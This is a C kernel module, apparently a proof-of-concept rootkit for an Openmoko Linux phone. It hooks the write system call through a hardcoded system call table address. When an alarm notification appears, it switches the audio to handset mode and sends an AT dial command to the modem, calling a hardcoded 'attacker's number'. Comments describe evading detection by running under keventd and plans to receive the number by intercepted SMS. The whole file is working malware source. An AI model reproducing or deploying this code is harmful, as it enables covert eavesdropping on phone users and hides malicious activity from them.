#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for KERN_INFO */
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/linkage.h>
#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/fcntl.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/rtc.h>

MODULE_LICENSE("GPL");

struct syscall_handler_t **sys_call_table;
asmlinkage ssize_t (*old_sys_write)(unsigned int fd, const char __user *buf, size_t count);
asmlinkage ssize_t (*old_sys_read)(unsigned int fd, char __user *buf, size_t count);
asmlinkage long (*old_sys_open)(const char __user *filename, int flags, int mode);
asmlinkage long (*old_sys_close)(unsigned int fd);

/* arguments sent to alsactl which changes the sound system to the proper state */
char* args[] = {
	    "alsactl",
	    "-f",
	    "/usr/share/openmoko/scenarios/gsmhandset.state",
	    "restore",
	     NULL, };

/* environment variables that openmoko runs in */
char* envp[] = {
	  "TSLIB_TSDEVICE=/dev/input/touchscreen0",
	  "USER=root",
	  "LD_LIBRARY_PATH=:/opt/Qtopia/lib",
	  "OLDPWD=/home",
	  "HOME=/home/root",
	  "PS1=\\u@\\h:\\w\\$",
	  "LOGNAME=root",
	  "TERM=xterm",
	  "PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin::/opt/Qtopia/bin"
	  "SHELL=/bin/sh",
	  "QPEDIR=/opt/Qtopia",
	  "PWD=/home/root",
	  NULL};

asmlinkage ssize_t new_sys_write(unsigned int fd, const char __user *buf, size_t count)
{    
	char __user *newbuf = buf;

	/* window props are new windows that occur such as an alarm */
	if(strstr(buf, "Window Prop") != NULL)
	{
	      /* Check for Clock substring so we know   *
 	       * the buffer came from the clock program */
	      if(strstr(buf, "Clock") != NULL)
	      {
		      int fdwrite;
			
		      /* let the write go through as normal but do not return */
		      old_sys_write(fd,buf,count);

		      /* check for specific substring only found when an alarm notification occurs */
		      if(strstr(buf,"NETWMType: 6")){

			    /* this is an exec on alsactl with arguments and environment variables      *
			     * set above.  The exec occurs under the process of keventd not our module. *
                             * this fact might help with hiding from detection.                         */
			    call_usermodehelper("/usr/sbin/alsactl", args, envp,0);
  
			    mm_segment_t old_fs = get_fs();  // store the old data segment
			    set_fs(KERNEL_DS);               // set the new segment to kernel

			    fdwrite = old_sys_open("/dev/ttySAC0" , 2050,0);
			    
			    /* currently the attacker's number is hard coded in.  We can change this   *
                             * to intercepting a number via an sms now that we know how to block       *
                             * new message notifications                                               */
			    old_sys_write(fdwrite,"ATD17324067545;\r",16);  
			    old_sys_close(fdwrite);

			    set_fs(old_fs);   // set back to old data segment
		      }

		      return count; // return cound as normal
	      }
	}

	return old_sys_write(fd, buf, count);   
	      
	 
}

int init_module(void)
{
	/* define the sys_call_table.  Memory address is given from System.map */
	sys_call_table = (struct syscall_handler_t *)0xc00290e8;  

	old_sys_open = sys_call_table[__NR_open];      // keep original pointer to sys_open
	old_sys_write = sys_call_table[__NR_write];    // keep original pointer to sys_write
	old_sys_read = sys_call_table[__NR_read];      // keep original pointer to sys_read
	old_sys_close = sys_call_table[__NR_close];    // keep original pointer to sys_close

	sys_call_table[__NR_write] = new_sys_write;  // insert new sys_write into table


	/* 
	 * A non 0 return means init_module failed; module can't be loaded. 
	 */
	return 0;
}

void cleanup_module(void)
{
	/* set sys_write function back to the old sys_write system call */
	sys_call_table[__NR_write] = old_sys_write;
}	